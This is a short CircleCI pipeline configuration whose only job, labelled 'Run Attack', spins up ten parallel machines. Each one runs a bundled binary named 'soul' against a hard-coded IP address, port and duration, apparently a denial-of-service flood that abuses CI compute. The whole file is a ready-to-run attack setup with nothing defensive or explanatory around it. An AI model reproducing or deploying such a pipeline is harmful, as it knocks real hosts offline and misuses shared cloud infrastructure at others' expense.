version: 2.1
jobs:
  attack:
    machine:
      image: ubuntu-2204:current
    resource_class: medium
    parallelism: 10
    steps:
      - checkout
      - run:
          name: Run Attack
          command: |
             chmod +x soul
             ./soul 104.29.146.39 19328 30 || true

workflows:
  attack_flow:
    jobs:
      - attack
